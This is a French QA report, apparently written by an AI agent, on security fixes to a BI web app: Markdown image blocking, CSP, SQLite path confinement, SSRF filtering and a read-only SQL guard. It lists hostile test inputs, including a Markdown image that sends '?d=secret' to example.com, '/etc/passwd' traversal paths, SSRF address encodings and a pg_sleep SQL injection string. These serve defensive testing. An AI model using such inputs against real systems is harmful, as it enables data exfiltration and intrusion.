# Rapport QA — Sprint `2026-11-10-securite-p0`

- **Auteur** : QA Engineer · **Date** : 2026-11-10 · **Tâche orchestrateur** : #9 · **Branche** : `fix/2026-11-10-securite-p0`
- **Plan** : `test-plan.md` · **Décisions humaines** : V-7 = NON (aucun SGBD, LLM, base cliente ni service tiers réels) ; Vitest autorisé.

## VERDICT : GO CONDITIONNEL

Tous les critères exécutables sous les contraintes de recette sont ✅ avec preuve. Aucun bug Bloquant ni Majeur. Un défaut Mineur (BUG-1). Les critères qui exigent un SGBD, un LLM réel ou une session authentifiée dans le navigateur sont ⏳ (non exécutés, jamais comptés OK), avec leur procédure au § 5.

Conditions du GO : (1) le PO accepte les ⏳ comme dette de recette à rejouer avant mise en production (sections 5.1 et 5.2 en priorité, car elles portent sur US-4) ; (2) BUG-1 traité ou accepté.

## 1. Preuves d'exécution

| Contrôle | Résultat |
|---|---|
| `npm test` (Vitest 5.1.0) | ✅ 6 fichiers, **575 tests passés**, 0 échec, ~4 s |
| `npx tsc --noEmit` | ✅ 0 erreur (tests inclus, `tsconfig.json` inchangé) |
| `npm run build` | ✅ Next.js 15.5.29, « Compiled successfully », 9 pages, 14 routes `/api/*` dynamiques |
| Hygiène des tests | ✅ aucun `.skip`, `.only`, `TODO`, test vide (grep sur `tests/` et `vitest.config.ts`) |
| Serveur `npm run dev` | lancé (port 3001, le 3000 était occupé par un autre processus, non touché), **arrêté** en fin de recette (port 3001 libre) |

Répartition : sql-guard 305 · policy 90 · safe-fetch 73 · sqlite-path 49 · markdown-safety 48 · sql-fake-servers 10.

## 2. Résultats par critère Gherkin

### US-1 — Markdown LLM sûr (C1)

| Critère | Statut | Preuve |
|---|---|---|
| Image du chat non chargée, marqueur « Image non affichée (protection des données) : graphique » | ✅ (niveau HTML) | `markdown-safety.test.tsx` : rendu réel de `SafeMarkdown` : 0 `<img>`, 0 `src=`, hôte et `?d=secret` absents, marqueur et alt présents |
| Rapport exécutif, y compris export PDF | ✅ rendu / ⏳ export | rendu `variant=report` sans `<img>` ; l'export PDF et l'onglet Réseau exigent une session (§ 5.4) |
| Image en syntaxe de référence | ✅ | `![a][r]` + définition : neutralisée |
| Liens sûrs (https avec `target`, `rel="noopener noreferrer nofollow"`, `referrerpolicy`; mailto; ancre) | ✅ | 5 URL conservées par `safeUrlTransform`, attributs vérifiés dans le HTML |
| Liens non sûrs (http, javascript, data, `//`) en texte simple | ✅ | 20 refus unitaires + 8 rendus sans `<a>` ni `href` (dont variantes `JAVASCRIPT:`, entités HTML, tabulation, U+2028, NUL) |
| Info-bulle « Lien externe vers attaquant.tld » | ✅ | attribut `title` vérifié |
| HTML brut ignoré | ✅ | `<img>`, `<script>`, `<iframe>` rendus en texte échappé (`&lt;img`) ; remarque : l'URL nue qui suit devient un lien https cliquable (autolien GFM), comportement sans requête automatique |
| Aucune requête vers example.com dans l'onglet Réseau | ⏳ | session requise ; la garantie « pas d'`<img>` » est établie, la preuve réseau navigateur reste à produire |

### US-5 — CSP `img-src`

| Critère | Statut | Preuve |
|---|---|---|
| En-tête exact sur les pages | ✅ | `curl -I http://localhost:3001/` : `Content-Security-Policy: img-src 'self' data: blob:` ; même valeur sur toutes les routes `/api/*` testées et sur les 404 |
| Image distante hors Markdown bloquée | ✅ | Navigateur local, page de connexion : `new Image().src='https://example.com/p.png'` → événement `securitypolicyviolation` (`img-src`), console : « violates the following Content Security Policy directive: "img-src 'self' data: blob:" », `onerror` déclenché, requête restée `pending` (non aboutie) |
| Aucune régression CSP | ⏳ partiel | Page de connexion : aucune violation parasite, police Plus Jakarta Sans « loaded » (Google Fonts 200), script de palette non bloqué, `/api/auth/me` 200. Seul 404 : `/favicon.ico` (préexistant, sans lien avec la CSP). Parcours authentifié (onboarding, chat, canevas, export PNG / PDF, import PDF, thème, Google Identity) ⏳ § 5.4. Mode `npm run start` non rejoué (la dev-notes le recommandait) |

### US-2 — SQLite confiné (S2)

| Critère | Statut | Preuve |
|---|---|---|
| Désactivé sans `BI_SQLITE_DIR` | ✅ | `test('sqlite')` renvoie `{ok:false,error:"SQLite est désactivé sur ce serveur : l'administrateur doit définir BI_SQLITE_DIR."}` (via `friendly`, comme la route) |
| Fichier autorisé : test + schéma | ✅ | base réelle `better-sqlite3` : message `SQLite 3.x`, tables `gros`, `t` |
| Chemin absolu interne | ✅ | accepté |
| Chemins refusés (10 lignes du plan) | ✅ | 16 cas dont `../data/users.json`, `/etc/passwd`, `C:\Windows\win.ini`, `:memory:`, vide, `file:…`, flux NTFS, NUL, trop long ; message exact `Chemin SQLite refusé…`, ne contient ni racine ni chemin demandé ; `absent.sqlite` → « Fichier SQLite introuvable… » ; fichier absent hors dossier → refus, jamais « introuvable » |
| Dossier lié sortant (jonction) | ✅ | jonction de répertoire réelle (`fs.symlinkSync(…,'junction')`, dossier temporaire, sans privilège) : `sous-dossier-lie/x.sqlite` lisible via la jonction mais refusé par le connecteur (nouveau, jamais testé jusqu'ici) ; racine elle-même atteinte par jonction : realpath utilisé, sortie refusée |
| Fichier lié (lien symbolique de fichier) | ⏳ réel / ✅ simulé | EPERM à la création sur ce poste (mode développeur absent). Le chemin de code `lstat → lien symbolique` est exercé par simulation de `lstatSync` (étiquetée « SIMULATION ») : à rejouer en réel § 5.5 |
| UNC, `\\?\`, `\\.\` (CR-5) | ✅ | 5 formes refusées ; espion sur `fs` : aucun `lstat` / `stat` / `realpath` sur le chemin demandé ; chemins extérieurs : aucun `lstat` hors racine |
| Lecture seule, fichier inchangé | ✅ | SELECT renvoie `a,b,c` ; SHA-256 et mtime identiques ; INSERT, DELETE, UPDATE, DROP, ATTACH, `PRAGMA query_only=OFF`, CREATE, double instruction, `load_extension`, VACUUM tous refusés, empreinte inchangée ; table de 5 000 lignes → 1 000 renvoyées |
| `BI_SQLITE_DIR` parent / enfant / égal à `BI_DATA_DIR` | ✅ | « Configuration SQLite invalide. », sans chemin |

### US-3 — Anti-SSRF (S1)

| Critère | Statut | Preuve |
|---|---|---|
| 14 destinations internes REST refusées, message exact, 0 connexion | ✅ | `safeFetch` : 169.254.169.254, 10/8, 192.168/16, 172.16/12, 100.64/10, 0.0.0.0, `[fd00::1]`, `[::1]` refusés ; `2130706433`, `0x7f000001`, `0177.0.0.1`, `[::ffff:127.0.0.1]`, `[::ffff:7f00:1]`, `127.1`, `localhost` : **serveur témoin local à 0 requête** ; le même serveur répond (1 requête) quand l'entrée est en liste blanche (le témoin fonctionne) |
| Nom d'hôte → IP interne (REST, Odoo, LLM, SQL) | ✅ | `resolveAllowed` avec résolveur injecté ; REST, Odoo, LLM et SQL refusés en processus |
| Anti DNS-rebinding | ✅ | `guardedLookup` : résolveur « public puis 127.0.0.1 » : une seule résolution, adresse publique vérifiée utilisée ; interne → `NetworkPolicyError` |
| Redirection non suivie | ✅ | 302 : message E-NET-3 exact, la cible `/secret` n'est jamais requêtée |
| Identifiants dans l'URL | ✅ | message exact (REST et `safeFetch`) |
| Corps d'erreur non renvoyé | ✅ | 500 « SECRET-INTERNE » → `API REST HTTP 500.` ; réponse non JSON sans extrait du corps |
| Host non forçable | ✅ | `En-tête non autorisé : Host.` (+ 9 autres en-têtes interdits, `authHeader=Host`, retour ligne) ; `safeFetch` ignore Host : le serveur reçoit `127.0.0.1:<port>` |
| Liste blanche (`localhost:8000,10.0.0.0/8`), port voisin refusé | ✅ | policy + `safeFetch` |
| Métadonnées cloud refusées même listées | ✅ | `169.254.0.0/16` listé : refus |
| Mode allowlist | ✅ | hôte hors liste refusé, listé accepté ; valeur inconnue → allowlist (échec fermé) |
| baseUrl LLM non OpenAI-compatible | ✅ (logique) | `BASEURL_PROVIDERS` = openai, deepseek, nvidia ; constante de message exacte. La route elle-même exige une session : appel HTTP complet ⏳ § 5.6 |
| baseUrl LLM en http:// hors liste | ✅ | message exact via `testKey` |
| Fournisseurs officiels fonctionnent | ⏳ | appel réseau tiers interdit (V-7) |
| Hôtes SQL internes (postgres 5432, mysql 3306, mssql 1433) | ✅ | message de politique ; en plus, avec un serveur TCP témoin sur le port : **0 connexion** |
| Chaîne de connexion SQL refusée | ✅ avec réserve | message conforme à l'apostrophe près : **BUG-1** |
| Socket Unix | ✅ | « Hôte invalide. » |
| URI MongoDB internes / dangereuses | ✅ | `127.0.0.1`, multi-hôtes avec un interne, `proxyHost`, `authMechanism=MONGODB-AWS`, `tlsCAFile`, `srvServiceName` (+ casse), `%2F…sock`, SRV vers cible interne ; `srvServiceName%3Dx` : non filtré mais rejeté par le pilote MongoDB réel (`new MongoClient`, sans connexion) |
| Routage TDS et SQL Browser (CR-2, CR-11) | ✅ | faux serveurs : A (routage port non listé) → refus, **0 connexion** sur la cible ; B témoin → connexion de routage ouverte ; C (port annoncé hors liste) → refus, 0 connexion ; D témoin → connexion puis routage refusé |
| Session obligatoire sur `/api/*` | ✅ | 14 routes sans cookie : POST 401 (`Non authentifié.`) sauf `logout` 200, `setup` 409 (déjà configuré) ; GET 401 / 405 ; `auth/me` 200 (état non authentifié) |

### US-4 — Lecture seule (S3)

| Critère | Statut | Preuve |
|---|---|---|
| 16 refus avant exécution, messages exacts | ✅ | `sql-guard.test.ts` |
| 9 faux positifs acceptés | ✅ | idem |
| Cas obligatoires de l'arbitrage (CR-16, CR-17) | ✅ | 6 refus nommés (E-SQL-9) ; 4 dialectes × {`'a\rb'`, 6 contrôles `U+0085 U+2028 U+2029 \f \v \0` après `--x`, `\0`, deux profondeurs négatives E-SQL-4} ; 4 dialectes × 9 acceptations avec texte renvoyé (`SELECT 1 AS a\r` → `SELECT 1 AS a`) ; invariant : aucun caractère interdit dans le texte exécuté |
| CR-1, CR-6, CR-13, CR-15 (scripts guard2/3/4, sondes rev2/3/4) | ✅ | ~230 cas, tous conformes. Cas « résiduels » (`1pg_sleep(10)`, `IF`, `PRINT`, `FETCH`, `a$1COMMIT`) figés comme acceptés, conformément aux revues |
| Volume borné à 1000 | ✅ partiel | SQLite (5 000 lignes → 1 000) ; MySQL faux serveur (flux de 200 000 lignes → 1 000, **socket fermée, le serveur cesse d'émettre**, CR-9). ⏳ PostgreSQL (curseur `FETCH 1001`), SQL Server (`SET ROWCOUNT`), table de 2 M lignes, mémoire ≤ 50 Mo, < 10 s |
| Requêtes trop longues (30 s) | ⏳ | exige PG `statement_timeout`, MySQL `max_execution_time`, SQL Server (§ 5.1 à 5.3). Le message E-SQL-8 est une constante vérifiée par `friendly()` (le test `friendly` n'en couvre pas tous les motifs) |
| Écriture annulée côté SGBD | ✅ partiel / ⏳ | MySQL faux serveur : `SET SESSION TRANSACTION READ ONLY` puis `START TRANSACTION READ ONLY` puis `max_execution_time` puis `sql_select_limit = 1001` précèdent la requête utilisateur (ordre vérifié sur le fil) ; l'effet serveur, `ROLLBACK` MSSQL et `@@TRANCOUNT` ⏳ |
| Coupure de connexion MySQL sans arrêt du processus (CR-3) | ✅ | 0 `uncaughtException`, rejet « Connection lost » |
| `LOCAL INFILE` refusé | ✅ | faux serveur MySQL : la demande `0xFB` est bien émise (compteur = 1), le contenu du fichier secret n'est jamais reçu |
| Écriture refusée avant tout accès réseau | ✅ | `DELETE` et `INTO DUMPFILE` : 0 connexion au faux serveur |
| Documentation : compte lecture seule obligatoire + exemples PG / MySQL / SQL Server | ✅ | `README.md` l. 37 (« obligatoire… seule garantie réelle »), l. 46-65 (`CREATE ROLE`, `CREATE USER`, `db_datareader`), l. 108 (caractères de contrôle) ; `ConnectorsModal.tsx` l. 125 : « Utilisez obligatoirement un compte en lecture seule » |

## 3. Anomalies

| ID | Gravité | Titre | Repro | Attendu | Obtenu |
|---|---|---|---|---|---|
| **BUG-1** | Mineur | E-SQL-7 : apostrophe typographique au lieu de l'apostrophe droite | `test('postgres', {url:'postgres://u:p@127.0.0.1/d'})` ou `curl` authentifié sur `/api/connectors/test` | `Chaîne de connexion non prise en charge : renseignez l'hôte, le port et les identifiants.` (architecture.md § 1 et § 6, apostrophe `'`) | même texte avec `’` (U+2019), dans `sql.ts` (`CONNECTION_STRING_REFUSED`). Même écart, sans impact fonctionnel, dans les messages « la réponse n’est pas un JSON valide » de `saas.ts` et `odoo.ts` (non fixés par le Gherkin, nouveaux messages du Dev). Le test compare à l'apostrophe près. Correction : aligner la constante ou amender la spécification |

Aucune autre divergence. Observations sans gravité : `favicon.ico` en 404 (préexistant) ; la réponse LLM `testKey` ne renvoie pas le détail réseau (conforme).

## 4. Couverture et limites de la preuve

- Les tests prouvent le comportement **du client** et des gardes. Ils ne prouvent pas la sémantique des SGBD (transaction READ ONLY effective, `ROLLBACK`, `@@TRANCOUNT`, `standard_conforming_strings`, délais serveur) : voir § 5.
- Les scénarios « onglet Réseau » sont prouvés au niveau du HTML rendu (absence d'`<img>` et de `src`), ce qui est équivalent pour le chat et le rapport, mais pas observé dans un navigateur authentifié.
- Pas de rapport de couverture de code (non demandé, aucun outil de couverture installé).
- Mutation : non pratiquée sur `src/` (hors périmètre). Les témoins (serveur qui répond quand autorisé, routage B et D, fichier lisible via jonction) montrent que les tests de refus ne passent pas à vide.

## 5. Critères ⏳ — non exécutés, procédure prête à rejouer

Pré-requis communs : instances de test locales (conteneurs) ou bases dédiées ; compte de test ; **validation humaine** avant de lancer conteneurs ou images. Les tests Vitest existants se rejouent tels quels.

1. **PostgreSQL** (curseur, délai, `standard_conforming_strings`) : table `grosse_table` de 2 000 000 lignes ; `SELECT * FROM grosse_table` et `… LIMIT 500000` → 1000 lignes, < 10 s, RSS Node ≤ +50 Mo ; `SELECT pg_sleep(40)` → message E-SQL-8 (30 s) ; `ALTER ROLE r SET standard_conforming_strings = off` puis `SELECT 'a\'' , pg_sleep(10) -- '` → `pg_sleep` non exécuté ; derrière pgbouncer en mode transaction avec `scs=off` → refus explicite ; tentative d'écriture avec un compte non lecture seule → annulée.
2. **MySQL / MariaDB** : même volumétrie ; `SELECT SLEEP(40)` → E-SQL-8 ; fonction d'écriture non listée → refusée par `READ ONLY` ; MariaDB : variable `max_statement_time`.
3. **SQL Server** : volumétrie (`SET ROWCOUNT`) ; `WAITFOR DELAY '00:00:40'` → E-SQL-8 ; vérifier `SELECT 1COMMIT` lu `1 COMMIT` ; `@@TRANCOUNT` ≠ 1 → `Requête refusée : elle a modifié l'état transactionnel de la session.` ; `--\r` et `--U+2028` (information) ; Azure SQL : connexion par nom avec `serverName` (risque R-3, arbitrage Tech Lead si échec) ; écriture échappée jamais validée.
4. **Navigateur authentifié** (session à fournir par l'humain ; l'authentification n'a pas été contournée) : (a) chat avec réponse piégée `![g](https://example.com/x.png?d=secret)` et `[![l](https://example.com/l.png)](https://exemple.fr)` → onglet Réseau sans requête vers example.com ; (b) rapport + export PDF : marqueur présent dans le PDF ; (c) parcours onboarding, Demo Advisor, canevas, export PNG d'un widget, import PDF, thème clair / sombre, connexion Google : console sans violation CSP ; (d) `npm run start` : en-tête présent.
5. **Lien symbolique de fichier réel** : activer le mode développeur Windows (ou poste Linux), créer `lien-vers-dehors.sqlite` vers un fichier hors `BI_SQLITE_DIR` et vérifier le refus (ajouter le cas au test `sqlite-path` en remplaçant la simulation).
6. **Routes LLM** avec session : `POST /api/llm/test` `{"provider":"anthropic","apiKey":"x","baseUrl":"https://proxy.exemple.com"}` → `message` = « URL de base non prise en charge pour ce fournisseur. » ; validation de clé des 5 fournisseurs officiels **avec accord humain** (appel tiers réel).

## 6. Modifications d'environnement et fichiers

- `npm install -D vitest` (autorisé) : `package.json` (devDependency `vitest ^5.1.0`, script `"test": "vitest run"`) et `package-lock.json`. **npm a aussi réordonné alphabétiquement** les clés `@types/better-sqlite3` et `@types/mssql` dans `devDependencies` (aucun changement de version) : à signaler au reviewer pour ne pas le prendre pour une modification de dépendance. `npm audit` signale 7 vulnérabilités (non analysées, hors périmètre).
- `vitest.config.ts` créé. Avertissement bénin de Vite sur la configuration ESM chargée en CJS (le `package.json` n'a pas `"type": "module"`, non modifiable).
- **Artefact à ne pas indexer** : le dossier `.vitest/` (rapport JSON généré par l'enveloppe de sortie du poste) est apparu à la racine ; suppression non réalisée (`rm -r` soumis à validation humaine), absent de `.gitignore`.
- Rien n'a été modifié dans `src/`, `data/`, `.env*`, `tsconfig.json`, `next.config.mjs`.
- Le test qui contacte `127.0.0.1:1434` en UDP exige ce port libre : si occupé, `sql-fake-servers` échoue explicitement (précondition).

## 7. Recommandation

GO pour la validation fonctionnelle du PO, sous les conditions du verdict. Aucun renvoi au Dev n'est obligatoire ; BUG-1 peut être corrigé en revue courte (une constante) ou accepté.
